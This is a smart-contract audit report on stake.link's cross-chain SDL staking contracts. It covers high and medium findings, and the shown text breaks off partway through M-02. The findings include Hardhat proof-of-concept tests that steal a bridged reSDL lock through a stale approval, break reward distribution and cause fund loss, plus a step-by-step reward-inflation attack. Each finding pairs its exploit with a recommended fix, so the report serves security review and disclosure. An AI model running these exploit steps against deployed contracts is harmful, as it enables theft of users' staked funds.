# stake.link - Findings Report

# Table of contents
- ### [Contest Summary](#contest-summary)
- ### [Results Summary](#results-summary)
- ## High Risk Findings
    - [H-01. A user can steal an already transfered and bridged reSDL lock because of approval](#H-01)
    - [H-02. Not Update Rewards in `handleIncomingUpdate` Function of `SDLPoolPrimary` Leads to Incorrect Reward Calculations](#H-02)
- ## Medium Risk Findings
    - [M-01. A user can lose funds in `sdlPoolSecondary` if tries to add more sdl tokens to a lock that has been queued to be completely withdrawn](#M-01)
    - [M-02. Attacker can exploit lock update logic on secondary chains to increase the amount of rewards sent to a specific secondary chain ](#M-02)
- ## Low Risk Findings
    - [L-01. SINGLE STEP OWNERSHIP TRANSFER PROCESS](#L-01)
    - [L-02. CCIP router address cannot be updated](#L-02)
    - [L-03. Accidental `renounceOwnership()` call can disrupt key operations in multiple contracts.](#L-03)
    - [L-04. Insufficient Gas Limit Specification for Cross-Chain Transfers in _buildCCIPMessage() method. WrappedTokenBridge.sol #210](#L-04)
    - [L-05. No validation for `_amount` in migrate function](#L-05)
    - [L-06. Lack of storage gap in SDLPool.sol can lead to upgrade storage slot collision.](#L-06)
    - [L-07. Fee Calculation inconsistency in WrappedTokenBridge](#L-07)
    - [L-08. WrappedTokenBridge#recoverTokens will drain the whole token balance](#L-08)
    - [L-09. Can lock Fund for 1 sec and unlock in same transaction to gain profit](#L-09)
    - [L-10. No Check for Transferring to Self](#L-10)
    - [L-11. Audit Report for SDLPool.sol - Scalability Concern](#L-11)
    - [L-12. Updates from the `secondary pool` to the `primary pool` may not be sent because there are `no rewards` for the secondary pool](#L-12)
    - [L-13. Single strategy failure blocks global reward distribution](#L-13)


# <a id='contest-summary'></a>Contest Summary

### Sponsor: stake.link

### Dates: Dec 22nd, 2023 - Jan 12th, 2024

[See more contest details here](https://www.codehawks.com/contests/clqf7mgla0001yeyfah59c674)

# <a id='results-summary'></a>Results Summary

### Number of findings:
   - High: 2
   - Medium: 2
   - Low: 13


# High Risk Findings

## <a id='H-01'></a>H-01. A user can steal an already transfered and bridged reSDL lock because of approval

_Submitted by [juan](/profile/clovisk7n0000jr084jv8dcur), [innertia](/profile/clkqyrmqu000gkz08274w833n), [rvierdiiev](/profile/clk48xt1x005yl50815kr7bpc), [0xTheBlackPanther](/profile/clnca1ftl0000lf08bfytq099), [alexfilippov314](/profile/cllj8zfsb0005ji08cjnwcjeb), [spacelord47](/profile/clohcveko000oi408c6ucqevl), [Draiakoo](/profile/clk3xadrc0020l808t9unuqkr), [0xHackerNight](/profile/cln0hezsl0008jt096eepzvj9), [0xbepresent](/profile/clk8nnlbx000oml080k0lz7iy), [ElHaj](/profile/clk40nytj001umb08c4ub87gx), [toshii](/profile/clkkffr6v0008mm0866fnnu0a). Selected submission by: [Draiakoo](/profile/clk3xadrc0020l808t9unuqkr)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/SDLPoolPrimary.sol#L172-L199

https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/SDLPoolSecondary.sol#L259-L281

## Summary
The reSDL token approval is not deleted when the lock is bridged to an other chain

## Vulnerability Details
When a reSDL token is bridged to an other chain, the `handleOutgoingRESDL()` function is called to make the state changes into the `sdlPool` contract. The function executes the following:

```
    function handleOutgoingRESDL(
        address _sender,
        uint256 _lockId,
        address _sdlReceiver
    )
        external
        onlyCCIPController
        onlyLockOwner(_lockId, _sender)
        updateRewards(_sender)
        updateRewards(ccipController)
        returns (Lock memory)
    {
        Lock memory lock = locks[_lockId];

        delete locks[_lockId].amount;
        delete lockOwners[_lockId];
        balances[_sender] -= 1;

        uint256 totalAmount = lock.amount + lock.boostAmount;
        effectiveBalances[_sender] -= totalAmount;
        effectiveBalances[ccipController] += totalAmount;

        sdlToken.safeTransfer(_sdlReceiver, lock.amount);

        emit OutgoingRESDL(_sender, _lockId);

        return lock;
    }
```
As we can see, it deletes the lock.amount of the lockId, removes the ownership of the lock and decrements the lock balance of the account that is bridging the lock.
The approval that the user had before bridging the reSDL lock will remain there and he can get benefited from it by stealing the NFT.
Consider the following situation:
A user knows that there is a victim that is willing to pay the underlying value for a reSDL lock ownership transfer. What the malicious user can do is set approval to move his lockId in all supported chains to an alt address that he owns. Then, he trades the underlying value for the reSDL ownership and the lock is transfered to the victim/buyer. If the buyer keeps the lock in this chain nothing happens, but if he bridges any of the other supported chains, the malicious user can use the approval of his alt account to steal the reSDL lock.

#### Proof of Concept
It is written inside `resdl-token-bridge.test.ts` because it uses its setup
```
  it('PoC steal reSDL', async () => {
    let lockId = 2

    let thief = accounts[0]
    let victim = accounts[1]

    let thiefAccount2 = accounts[2]

    let ts = (await ethers.provider.getBlock(await ethers.provider.getBlockNumber())).timestamp

    // Thief approves an alt account that he controls to move his lock in the original chain
    await sdlPool.approve(thiefAccount2, lockId)

    assert.equal(await sdlPool.getApproved(2), thiefAccount2);

    // Thief bridges the lock to an other chain but the approval is not deleted
    await bridge.transferRESDL(77, victim, lockId, true, toEther(10), { value: toEther(10) })
    let lastRequestMsg = await onRamp.getLastRequestMessage()
    assert.deepEqual(
      ethers.utils.defaultAbiCoder
        .decode(
          ['address', 'uint256', 'uint256', 'uint256', 'uint64', 'uint64', 'uint64'],
          lastRequestMsg[1]
        )
        .map((d, i) => {
          if (i == 0) return d
          if (i > 1 && i < 4) return fromEther(d)
          return d.toNumber()
        }),
      [victim, lockId, 1000, 1000, ts, 365 * 86400, 0]
    )
    assert.deepEqual(
      lastRequestMsg[2].map((d) => [d.token, fromEther(d.amount)]),
      [[sdlToken.address, 1000]]
    )
    assert.equal(lastRequestMsg[3], wrappedNative.address)
    assert.equal(lastRequestMsg[4], '0x11')
    await expect(sdlPool.ownerOf(lockId)).to.be.revertedWith('InvalidLockId()')

    // The user that received the lock from bridging on the other chain decides to bridge the lock id
    // back to the original chain
    await offRamp
      .connect(signers[6])
      .executeSingleMessage(
        ethers.utils.formatBytes32String('messageId'),
        77,
        ethers.utils.defaultAbiCoder.encode(
          ['address', 'uint256', 'uint256', 'uint256', 'uint64', 'uint64', 'uint64'],
          [victim, lockId, 1000, 1000, ts, 365 * 86400, 0]
        ),
        sdlPoolCCIPController.address,
        [{ token: sdlToken.address, amount: toEther(25) }]
      )


    // Now the victim owns the reSDL lock on the original chain
    assert.equal(await sdlPool.ownerOf(2), victim)

    // However, this lockId has the approval that originally the thief set to his alt account and victim do not know that
    assert.equal(await sdlPool.getApproved(2), thiefAccount2);

    // Thief transfers back to his main account the reSDL via his alt account
    await sdlPool
      .connect(signers[2])
      .transferFrom(victim, thief, lockId)

    // Thief is now the owner of the reSDL
    assert.equal(await sdlPool.ownerOf(2), thief)
  })
```

## Impact
High, possibility to steal funds

## Tools Used
Manual review

## Recommendations
When bridging a lock between chains, the lock approval should be deleted.

```diff
     function handleOutgoingRESDL(
         address _sender,
         uint256 _lockId,
         address _sdlReceiver
     )
         external
         onlyCCIPController
         onlyLockOwner(_lockId, _sender)
         updateRewards(_sender)
         updateRewards(ccipController)
         returns (Lock memory)
     {
         Lock memory lock = locks[_lockId];
 
         delete locks[_lockId].amount;
         delete lockOwners[_lockId];
         balances[_sender] -= 1;
+        delete tokenApprovals[_lockId];

         uint256 totalAmount = lock.amount + lock.boostAmount;
         effectiveBalances[_sender] -= totalAmount;
         effectiveBalances[ccipController] += totalAmount;

         sdlToken.safeTransfer(_sdlReceiver, lock.amount);

         emit OutgoingRESDL(_sender, _lockId);

         return lock;
     }
```
## <a id='H-02'></a>H-02. Not Update Rewards in `handleIncomingUpdate` Function of `SDLPoolPrimary` Leads to Incorrect Reward Calculations

_Submitted by [ElHaj](/profile/clk40nytj001umb08c4ub87gx), [innertia](/profile/clkqyrmqu000gkz08274w833n), [Fondevs](/profile/clkrnxc3b000gl70879sx2swb). Selected submission by: [ElHaj](/profile/clk40nytj001umb08c4ub87gx)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/SDLPoolPrimary.sol#L231

## Summary
Failing to update rewards before executing the [`handleIncomingUpdate`](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/SDLPoolPrimary.sol#L231) function in [`SDLPoolPrimary`](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/SDLPoolPrimary.sol), while adjusting the `effectiveBalance` of the [`ccipController`](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/ccip/SDLPoolCCIPControllerPrimary.sol), results in miscalculated rewards. This oversight can obstruct the distribution of rewards for the secondary chain.

## Vulnerability Details
- Actions taken in the secondary pool are queued and then communicated to the primary pool. The primary pool must acknowledge these changes before they are executed. The message sent to the primary pool includes the number of new queued locks to be minted (`numNewQueuedLocks`) and the change in the reSDL supply (`reSDLSupplyChange`).

- Upon receiving the message, the [`SDLPoolCCIPControllerPrimary` ](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/ccip/SDLPoolCCIPControllerPrimary.sol) contract updates the `reSDLSupplyByChain` and forwards the message to [`SDLPoolPrimary`](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/SDLPoolPrimary.sol#L231). The [`SDLPoolPrimary`](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/SDLPoolPrimary.sol#L231) contract then processes the message, returning the `mintStartIndex` for the secondary chain to use when minting new locks. It also updates the [`effectiveBalances`](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/SDLPoolPrimary.sol#L243)  for the `ccipController` and the `totalEffectiveBalance`.
```js
  function _ccipReceive(Client.Any2EVMMessage memory _message) internal override {
        uint64 sourceChainSelector = _message.sourceChainSelector;

        (uint256 numNewRESDLTokens, int256 totalRESDLSupplyChange) = abi.decode(_message.data, (uint256, int256));

        if (totalRESDLSupplyChange > 0) {
  >>        reSDLSupplyByChain[sourceChainSelector] += uint256(totalRESDLSupplyChange);
        } else if (totalRESDLSupplyChange < 0) {
  >>        reSDLSupplyByChain[sourceChainSelector] -= uint256(-1 * totalRESDLSupplyChange);
        }
  >>    uint256 mintStartIndex =ISDLPoolPrimary(sdlPool).handleIncomingUpdate(numNewRESDLTokens, totalRESDLSupplyChange);   
        _ccipSendUpdate(sourceChainSelector, mintStartIndex);

        emit MessageReceived(_message.messageId, sourceChainSelector);
    }
```

- The issue arises because the [`handleIncomingUpdate`](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/SDLPoolPrimary.sol#L231) function does not update the rewards before altering these values. Since these values directly affect reward accounting, failing to update them leads to incorrect calculations. This could result in a scenario where the total rewards accrued by all stakers exceed the available balance in the `rewardsPool`.
```js
  function handleIncomingUpdate(uint256 _numNewRESDLTokens, int256 _totalRESDLSupplyChange)
        external
        onlyCCIPController
        returns (uint256)
    {
       // some code ...

        if (_totalRESDLSupplyChange > 0) {
>>            effectiveBalances[ccipController] += uint256(_totalRESDLSupplyChange);
>>           totalEffectiveBalance += uint256(_totalRESDLSupplyChange);
        } else if (_totalRESDLSupplyChange < 0) {
>>           effectiveBalances[ccipController] -= uint256(-1 * _totalRESDLSupplyChange);
>>            totalEffectiveBalance -= uint256(-1 * _totalRESDLSupplyChange);
        }
  // more code ....
    }
```
- For example, consider Alice has staked `500 sdl` tokens, and there is an outgoing `1000 reSdl`. The state would be as follows:

- `effectiveBalance[alice]` = **500**
- `effectiveBalance[ccipController]` = **1000**
- `totalEffectiveBalance` = **1500**

- Now, assume `1500 reward` tokens are distributed this will update the `rewardPerToken = 1` (rewards/totalStaked), and Alice will withdraw her rewards. The amount of rewards Alice receives is calculated using the [`withdrawableRewards`](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/RewardsPool.sol#L38) function, which relies on her `effectiveBalance` (controller.staked()). With a `rewardPerToken` of `1` and Alice's `userRewardPerTokenPaid` at `0`, Alice would receive `500 rewards`.
 ```js
   function withdrawableRewards(address _account) public view virtual returns (uint256) {
        return (controller.staked(_account) *(rewardPerToken - userRewardPerTokenPaid[_account]) ) / 1e18
            + userRewards[_account];
    }
  ```

- now, someone stakes another `1000 sdl` on the secondary chain, an incoming update with a supply change of `1000` is received on the primary chain. This update changes the `effectiveBalance[ccipController]` to `2000` without a prior reward update which will keep the `userRewardPerTokenPaid` for ccipController 0. 
  ```js
     function handleIncomingUpdate(uint256 _numNewRESDLTokens, int256 _totalRESDLSupplyChange)external onlyCCIPController returns (uint256){
        uint256 mintStartIndex;
        if (_numNewRESDLTokens != 0) {
            mintStartIndex = lastLockId + 1;
            lastLockId += _numNewRESDLTokens;
        }

        if (_totalRESDLSupplyChange > 0) {
   >>        effectiveBalances[ccipController] += uint256(_totalRESDLSupplyChange);
            totalEffectiveBalance += uint256(_totalRESDLSupplyChange);
        } else if (_totalRESDLSupplyChange < 0) {
            effectiveBalances[ccipController] -= uint256(-1 * _totalRESDLSupplyChange);
            totalEffectiveBalance -= uint256(-1 * _totalRESDLSupplyChange);
        }

        emit IncomingUpdate(_numNewRESDLTokens, _totalRESDLSupplyChange, mintStartIndex);

        return mintStartIndex;
    }
  ``` 

- Consequently, when the [`RewardsInitiator`](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/RewardsInitiator.sol#L41) contract calls the [`distributeRewards`](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/ccip/SDLPoolCCIPControllerPrimary.sol#L56) function in [`SDLPoolCCIPControllerPrimary`](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/ccip/SDLPoolCCIPControllerPrimary.sol), attempting to `withdrawRewards` from the `rewardPool` the call will perpetually fail. The rewards for the [`ccipController`](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/ccip/SDLPoolCCIPControllerPrimary.sol) would be calculated as `2000 * (1 - 0) = 2000 rewards`, while the actual balance of the `rewardsPool` is only `1000 rewards`.
  ```js
     function distributeRewards() external onlyRewardsInitiator {
        uint256 totalRESDL = ISDLPoolPrimary(sdlPool).effectiveBalanceOf(address(this));
        address[] memory tokens = ISDLPoolPrimary(sdlPool).supportedTokens();
        uint256 numDestinations = whitelistedChains.length;

    >> ISDLPoolPrimary(sdlPool).withdrawRewards(tokens);
        // ... more code ..
    }
  ```

- notice that the increase of `1000` will never be solved . 

## POC 
- here a poc that shows , that not updating reward in incomingUpdates , will cause the distributeReward function to revert , cause of insufficient balance in the reward pool , i used the repo setup : 
```js
 import { ethers } from 'hardhat'
import {  expect } from 'chai'
import { toEther, deploy, deployUpgradeable, getAccounts, fromEther } from '../../utils/helpers'
import {
  ERC677,
  CCIPOnRampMock,
  CCIPOffRampMock,
  CCIPTokenPoolMock,
  SDLPoolPrimary,
  SDLPoolCCIPControllerPrimary,
  Router,
} from '../../../typechain-types'
import {  Signer } from 'ethers'

describe('SDLPoolCCIPControllerPrimary', () => {
  let linkToken: ERC677
  let sdlToken: ERC677
  let token1: ERC677
  let token2: ERC677
  let controller: SDLPoolCCIPControllerPrimary
  let sdlPool: SDLPoolPrimary
  let onRamp: CCIPOnRampMock
  let offRamp: CCIPOffRampMock
  let tokenPool: CCIPTokenPoolMock
  let tokenPool2: CCIPTokenPoolMock
  let router: any
  let accounts: string[]
  let signers: Signer[]

  before(async () => {
    ;({ signers, accounts } = await getAccounts())
  })

  beforeEach(async () => {
    linkToken = (await deploy('ERC677', ['Chainlink', 'LINK', 1000000000])) as ERC677 // deploy the link token ..
    sdlToken = (await deploy('ERC677', ['SDL', 'SDL', 1000000000])) as ERC677 // deploy the sdl token 
    token1 = (await deploy('ERC677', ['2', '2', 1000000000])) as ERC677
    token2 = (await deploy('ERC677', ['2', '2', 1000000000])) as ERC677

    const armProxy = await deploy('CCIPArmProxyMock')
    // router takes the wrapped native , and the armProxy address 
    router = (await deploy('Router', [accounts[0], armProxy.address])) as Router
    tokenPool = (await deploy('CCIPTokenPoolMock', [token1.address])) as CCIPTokenPoolMock // token1 pool for cross chain deposit and withdraw  
    tokenPool2 = (await deploy('CCIPTokenPoolMock', [token2.address])) as CCIPTokenPoolMock // token2 pool for crosschain deposit and withdraw . 
    onRamp = (await deploy('CCIPOnRampMock', [ // deploy the onRamp 
      [token1.address, token2.address],
      [tokenPool.address, tokenPool2.address],
      linkToken.address,
    ])) as CCIPOnRampMock
    offRamp = (await deploy('CCIPOffRampMock', [
      router.address,
      [token1.address, token2.address],
      [tokenPool.address, tokenPool2.address],
    ])) as CCIPOffRampMock

    await router.applyRampUpdates([[77, onRamp.address]], [], [[77, offRamp.address]])

    let boostController = await deploy('LinearBoostController', [4 * 365 * 86400, 4])
    sdlPool = (await deployUpgradeable('SDLPoolPrimary', [
      'reSDL',
      'reSDL',
      sdlToken.address,
      boostController.address,
    ])) as SDLPoolPrimary
    controller = (await deploy('SDLPoolCCIPControllerPrimary', [
      router.address,
      linkToken.address,
      sdlToken.address,
      sdlPool.address,
      toEther(10),
    ])) as SDLPoolCCIPControllerPrimary

    await linkToken.transfer(controller.address, toEther(100))
    await sdlToken.transfer(accounts[1], toEther(200))
    await sdlPool.setCCIPController(controller.address)
    await controller.setRESDLTokenBridge(accounts[5])
    await controller.setRewardsInitiator(accounts[0])
    await controller.addWhitelistedChain(77, accounts[4], '0x11', '0x22')
  })

 

  it('poc that when there is encoming updates the rewared is wrong calculated',async () => {
      let wToken = await deploy('WrappedSDTokenMock', [token1.address])
      let rewardsPool = await deploy('RewardsPoolWSD', [
        sdlPool.address,
        token1.address,
        wToken.address,
      ])
      let wtokenPool = (await deploy('CCIPTokenPoolMock', [wToken.address])) as CCIPTokenPoolMock
      await sdlPool.addToken(token1.address, rewardsPool.address)
      await controller.approveRewardTokens([wToken.address]) // approve the wrapped token to wroter from the ccipPramiry
      await controller.setWrappedRewardToken(token1.address, wToken.address)
      await onRamp.setTokenPool(wToken.address, wtokenPool.address)
      await offRamp.setTokenPool(wToken.address, wtokenPool.address)
      //1.user stakes : 
      await sdlToken.transferAndCall(sdlPool.address,toEther(1000),ethers.utils.defaultAbiCoder.encode(['uint256', 'uint64'], [0, 0]))
      //2.distrubute rewared : 
      await token1.transferAndCall(sdlPool.address, toEther(1000), '0x')
      //3. @audit incoming updates from secondary chain with 1000 resdl in supplychange : 
      await offRamp.connect(signers[4]).executeSingleMessage(
         ethers.utils.formatBytes32String('messageId'),
        77,
        ethers.utils.defaultAbiCoder.encode(['uint256','int256'], [3,toEther(1000)]),
        controller.address,
        []
      )
      // here the error : the sum of withdrawable rewards , will be more then the availabel reward balance in rewardPool . 
      let user = await sdlPool.withdrawableRewards(accounts[0]) // get the user withdrawAble rewards : 
      let wr = await sdlPool.withdrawableRewards(controller.address) // get the ccipController withdrawable rewards : 
      let rewardsAvailable = (await rewardsPool.totalRewards()) // get the total rewared available to distribute : 
      // since not user withdrew reward nor ccipController , the total rewareds should be greater or equal the total withdrawAble rewards , but this not the case : 
      expect(fromEther((wr[0].add(user[0])))).greaterThan(fromEther(rewardsAvailable))
      // now when the staker withdraw rewards the remain rewards will be not enough for ccipController : 
      await sdlPool.withdrawRewards([token1.address]);
      // distributing rewards will revert, since there is not enough balance to cover the ccipController rewards :
      await expect(controller.distributeRewards())
      .to.be.revertedWith('');
   })
 
})
```

## Impact
Incorrect reward calculations could  prevent rightful stakers from receiving their due rewards or leave unclaimable rewards in the pool (in the case of negative supply change), thereby compromising the protocol's credibility.
## Tools Used
manual review
## recommendations : 
- Implement an `updateReward(ccipController)` call within the `handleIncomingUpdate` function to ensure rewards are recalculated whenever `effectiveBalance` changes. This will prevent miscalculations and maintain reward distribution accuracy. 
```Diff
 function handleIncomingUpdate(uint256 _numNewRESDLTokens, int256 _totalRESDLSupplyChange)
        external
++      updateRewards(ccipController)
        onlyCCIPController
        returns (uint256)
     {
        uint256 mintStartIndex;
        if (_numNewRESDLTokens != 0) {
            mintStartIndex = lastLockId + 1;
            lastLockId += _numNewRESDLTokens;
        }

        if (_totalRESDLSupplyChange > 0) {
            effectiveBalances[ccipController] += uint256(_totalRESDLSupplyChange);
            totalEffectiveBalance += uint256(_totalRESDLSupplyChange);
        } else if (_totalRESDLSupplyChange < 0) {
            effectiveBalances[ccipController] -= uint256(-1 * _totalRESDLSupplyChange);
            totalEffectiveBalance -= uint256(-1 * _totalRESDLSupplyChange);
        }

        emit IncomingUpdate(_numNewRESDLTokens, _totalRESDLSupplyChange, mintStartIndex);

        return mintStartIndex;
    }
```

# Medium Risk Findings

## <a id='M-01'></a>M-01. A user can lose funds in `sdlPoolSecondary` if tries to add more sdl tokens to a lock that has been queued to be completely withdrawn

_Submitted by [minhquanym](/profile/clk6zbl4m001ql708o5hou98g), [naruto](/profile/clphrx1k300003i3mv5qmh2t9), [innertia](/profile/clkqyrmqu000gkz08274w833n), [0xbrivan2](/profile/clp1dquol0000kupd1wulucuy), [Draiakoo](/profile/clk3xadrc0020l808t9unuqkr), [ElHaj](/profile/clk40nytj001umb08c4ub87gx), [0xbepresent](/profile/clk8nnlbx000oml080k0lz7iy). Selected submission by: [Draiakoo](/profile/clk3xadrc0020l808t9unuqkr)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/SDLPoolSecondary.sol#L144

https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/SDLPoolSecondary.sol#L214-L239

https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/SDLPoolSecondary.sol#L451-L510

## Summary
In a secondary chain, if a user adds more sdl amount into a lock that he has queued to withdraw all the amount in the same index batch, he will lose the extra amount he deposited

## Vulnerability Details
The process to withdraw all the funds from a lock in a primary chain is just by calling withdraw with all the base amount of the lock. At this point the user will get immediately his funds back and the lock will be deleted, hence the owner will be zero address.

However, in a secondary chain, a user has to queue a withdraw of all the funds and wait for the keeper to send the update to the primary chain to execute the updates and then receive his sdl token back. In this period of time when the keeper does not send the update to the primary chain, if a user queues a withdraw of all the lock base amount, he will still own the lock because the withdraw has not been executed, just queued. So the user can still do whatever modification in his lock, for example, increase his lock base amount by calling `transferAndCall()` in the `sdlToken` passing the address of the `sdlSecondaryPool` as argument.

If this happens, when the keeper send the update to the primary chain and the user executes the updates for his lockId, he will lose this extra amount he deposited because it will execute the updates in order, and it will start with the withdraw of all the funds, will delete the ownership (make the zero address as the owner), and then increase the base amount of the lock that now owns the zero address.

And basically the lockId will be owned by the zero address with base amount as the extra sdl tokens that the user sent.

#### Proof of Concept
It is written inside `sdl-pool-secondary.test.ts` because it uses its setup

```
  it('PoC user will lose extra deposited tokens', async () => {

    let user = accounts[1]
    let initialUserSDLBalance = await sdlToken.balanceOf(user);

    // User creates a lock depositing some amount
    await sdlToken
      .connect(signers[1])
      .transferAndCall(
        sdlPool.address,
        toEther(100),
        ethers.utils.defaultAbiCoder.encode(['uint256', 'uint64'], [0, 0])
      )

    await sdlPool.handleOutgoingUpdate()
    await sdlPool.handleIncomingUpdate(1)
    await sdlPool.connect(signers[1]).executeQueuedOperations([])

    assert.equal(await sdlPool.ownerOf(1), user)
    
    // User queues a withdraw of all the amount from the lock
    await sdlPool.connect(signers[1]).withdraw(1, toEther(100))

    // User wants to deposit more tokens to the lock without the withdraw being updated and still being in the queue
    await sdlToken
      .connect(signers[1])
      .transferAndCall(
        sdlPool.address,
        toEther(1000),
        ethers.utils.defaultAbiCoder.encode(['uint256', 'uint64'], [1, 0])
      )

    await sdlPool.handleOutgoingUpdate()
    await sdlPool.handleIncomingUpdate(2)
    // When executing the updates, zero address will be the owner of his lock
    // and the amount he diposited the last time will be lost
    await sdlPool.connect(signers[1]).executeQueuedOperations([1])

    let finalUserSDLBalance = await sdlToken.balanceOf(user);
    let sdlLost = initialUserSDLBalance.sub(finalUserSDLBalance)

    console.log("The user has lost", sdlLost.toString(), "sdl tokens")

    // This staticall should revert because now the lock owner is the zero address
    await expect(sdlPool.ownerOf(1)).to.be.revertedWith('InvalidLockId()')
  })
```

Output:
```
  SDLPoolSecondary
The user has lost 1000000000000000000000 sdl tokens
    ✔ PoC user is not able to execute his lock updates (159ms)


  1 passing (3s)
```

## Impact
High, user will lose funds

## Tools Used
Manual review

## Recommendations
When trying to do any action on a lock in a secondary pool, check if the last update queued has not 0 as the base amount. Because if it is the case, that would mean that the user queued a withdraw of all funds and he will lose ownership of the lock at the next keeper update.

```diff
     function _queueLockUpdate(
         address _owner,
         uint256 _lockId,
         uint256 _amount,
         uint64 _lockingDuration
     ) internal onlyLockOwner(_lockId, _owner) {
         Lock memory lock = _getQueuedLockState(_lockId);
+        if(lock.amount == 0) revert();
         LockUpdate memory lockUpdate = LockUpdate(updateBatchIndex, _updateLock(lock, _amount, _lockingDuration));
         queuedLockUpdates[_lockId].push(lockUpdate);
         queuedRESDLSupplyChange +=
             int256(lockUpdate.lock.amount + lockUpdate.lock.boostAmount) -
             int256(lock.amount + lock.boostAmount);
         if (updateNeeded == 0) updateNeeded = 1;

         emit QueueUpdateLock(_owner, _lockId, lockUpdate.lock.amount, lockUpdate.lock.boostAmount, lockUpdate.lock.duration);
     }
```
## <a id='M-02'></a>M-02. Attacker can exploit lock update logic on secondary chains to increase the amount of rewards sent to a specific secondary chain 

_Submitted by [rvierdiiev](/profile/clk48xt1x005yl50815kr7bpc), [crippie](/profile/clkitmhs50000l508e5tvl2w2), [alexfilippov314](/profile/cllj8zfsb0005ji08cjnwcjeb), [innertia](/profile/clkqyrmqu000gkz08274w833n), [toshii](/profile/clkkffr6v0008mm0866fnnu0a), [Fondevs](/profile/clkrnxc3b000gl70879sx2swb). Selected submission by: [toshii](/profile/clkkffr6v0008mm0866fnnu0a)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/SDLPoolSecondary.sol#L428-L443

https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/base/SDLPool.sol#L408-L434

https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/SDLPoolSecondary.sol#L451-L510

## Summary

Users with existing reSDL NFTs on secondary chains (prior to a decrease in `maxBoost`) are able to increase `queuedRESDLSupplyChange` by a greater amount than should be possible given the current `maxBoost` value, which then allows them to funnel more rewards to their secondary chain (as `queuedRESDLSupplyChange` maps to `reSDLSupplyByChain[...]`, which is used to calculate the rewards distributed to each secondary chain). 

## Vulnerability Details

Consider the scenario in which the stake.link team is decreasing the `maxBoost` value of the `LinearBoostController` so that newer depositors will get less rewards than OG depositors. This will allow an attacker on a secondary chain to perform the following attack to fraudulently increase the amount of rewards sent to their chain:

We will assume for simplicity that the starting values for the `LinearBoostController` contract is a `maxBoost`=10 and `maxLockingDuration` = 10_000 seconds. The attacker starts with a single (for simplicity) reSDL NFT on a secondary chain which has `amount`=100_000 and `lockingDuration`= 5_000 seconds, meaning their boost is calculated to be: 100_000 * 10 * 5_000/10_000 = 500_000. 

Then, the stake.link team decreases `maxBoost` to 5. Following this, the attacker will first call `SDLPoolSecondary:extendLockDuration` with a `_lockingDuration` of 9_999, which then calls the internal [`_queueLockUpdate`](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/SDLPoolSecondary.sol#L428-L443), which is defined as follows:
```solidity
function _queueLockUpdate(
    address _owner,
    uint256 _lockId,
    uint256 _amount,
    uint64 _lockingDuration
) internal onlyLockOwner(_lockId, _owner) {
    Lock memory lock = _getQueuedLockState(_lockId);
@>    LockUpdate memory lockUpdate = LockUpdate(updateBatchIndex, _updateLock(lock, _amount, _lockingDuration));
    queuedLockUpdates[_lockId].push(lockUpdate);
@>    queuedRESDLSupplyChange +=
        int256(lockUpdate.lock.amount + lockUpdate.lock.boostAmount) -
        int256(lock.amount + lock.boostAmount);
    ...
}
```

As part of this function call, [`_updateLock`](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/base/SDLPool.sol#L408-L434) is triggered to perform this update, which is defined as follows:
```solidity
function _updateLock(
    Lock memory _lock,
    uint256 _amount,
    uint64 _lockingDuration
) internal view returns (Lock memory) {
@>    if ((_lock.expiry == 0 || _lock.expiry > block.timestamp) && _lockingDuration < _lock.duration) {
        revert InvalidLockingDuration();
    }

    Lock memory lock = Lock(_lock.amount, _lock.boostAmount, _lock.startTime, _lock.duration, _lock.expiry);

    uint256 baseAmount = _lock.amount + _amount;
@>    uint256 boostAmount = boostController.getBoostAmount(baseAmount, _lockingDuration);

    ...
    lock.boostAmount = boostAmount;
    ...
}
```
Most important to note here is that (1) since the `_lockingDuration` of 9_999 is greater than the existing duration of 5_000, this call will succeed, and (2) the `boostAmount` is recalculated now using the new `maxBoost` value of 5. We can calculate the new attacker's `boostAmount` to be: 100_000 * 5 * 9_9999/10_000 = 499_950. Since this value is less than the previous 500_000, `queuedRESDLSupplyChange` in the `_queueLockUpdate` call will be decremented by 50.

After the `SDLPoolSecondary:extendLockDuration` function call is complete, this update will be queued. At some point an update to this secondary SDL pool will be triggered & once that's complete, the attacker will then be able to execute this update. To do so, the attacker calls `executeQueuedOperations`, specifying their reNFT, which then triggers [`_executeQueuedLockUpdates`](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/SDLPoolSecondary.sol#L451-L510) which has the following logic:
```solidity
...
uint256 numUpdates = queuedLockUpdates[lockId].length;

Lock memory curLockState = locks[lockId];
uint256 j = 0;
while (j < numUpdates) {
	if (queuedLockUpdates[lockId][j].updateBatchIndex > finalizedBatchIndex) break;

	Lock memory updateLockState = queuedLockUpdates[lockId][j].lock;
	int256 baseAmountDiff = int256(updateLockState.amount) - int256(curLockState.amount);
@>	int256 boostAmountDiff = int256(updateLockState.boostAmount) - int256(curLockState.boostAmount);

	if (baseAmountDiff < 0) {
